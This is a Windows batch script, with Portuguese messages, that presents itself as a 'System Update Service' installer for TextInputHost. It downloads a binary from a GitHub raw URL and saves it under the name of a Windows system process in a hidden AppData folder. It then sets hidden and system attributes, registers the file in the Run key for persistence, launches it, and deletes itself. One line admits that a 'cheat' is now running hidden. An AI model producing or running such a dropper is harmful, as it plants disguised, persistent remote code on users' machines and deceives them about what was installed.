@echo off
setlocal EnableDelayedExpansion
title System Update Service
cd /d "%~dp0"

echo.
echo ================================================
echo   INSTALADOR DE SERVICO - TextInputHost
echo ================================================
echo.

rem --- CONFIGURACAO DO GITHUB ---
set "REPO_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/WinSystemAsset.bin"
set "TARGET_NAME=TextInputHost.exe"
set "TARGET_DIR=%APPDATA%\Microsoft\Windows\SystemData"
rem ------------------------------

rem 1. Verificar Privilegios
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] EXECUTE COMO ADMINISTRADOR.
    pause
    exit /b 1
)

echo [1/5] Encerrando instancias existentes...
taskkill /f /im TextInputHost.exe >nul 2>&1
taskkill /f /im FontCacheHost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo [2/5] Limpando diretoria de sistema...
if not exist "!TARGET_DIR!" mkdir "!TARGET_DIR!"
attrib -h -s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1
del /f /q "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1

echo [3/5] Baixando do GitHub: !REPO_URL!
rem Forca o download usando o curl do Windows
curl -s -L "!REPO_URL!" -o "!TARGET_DIR!\!TARGET_NAME!"

if not exist "!TARGET_DIR!\!TARGET_NAME!" (
    echo [ERRO] Falha critica no download. Verifique sua conexao ou se o arquivo existe no GitHub.
    pause
    exit /b 1
)

rem Verifica se o download e um arquivo real ou erro 404 (arquivos menores que 50kb sao erro)
for /f "usebackq" %%A in ('"!TARGET_DIR!\!TARGET_NAME!"') do set size=%%~zA
if !size! LSS 50000 (
    echo [ERRO] O arquivo baixado e INVALIDO (Error 404 ou Repo Privado).
    echo Certifique-se de que o repositorio 'unknow2' e PUBLICO no GitHub.
    del "!TARGET_DIR!\!TARGET_NAME!"
    pause
    exit /b 1
)
echo   [OK] Download concluido e verificado (!size! bytes).

echo [4/5] Configurando persistencia e ocultacao...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TextInputService" /t REG_SZ /d "\"!TARGET_DIR!\!TARGET_NAME!\" --monitor" /f >nul 2>&1
attrib +h +s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1

echo [5/5] Iniciando servico em modo monitor...
start "" "!TARGET_DIR!\!TARGET_NAME!" --monitor

echo.
echo ================================================
echo   INSTALACAO CONCLUIDA COM SUCESSO!
echo ================================================
echo.
echo Para finalizar a instalacao e garantir a limpeza,
echo o computador precisa ser reiniciado.
echo.
set /p "choice=Deseja reiniciar o computador agora? (S/N): "
if /i "!choice!"=="S" (
    shutdown /r /t 5
) else (
    echo O cheat ja esta rodando oculto. Auto-deletando instalador...
    timeout /t 3 >nul
    (goto) 2>nul & del "%~f0"
)
exit
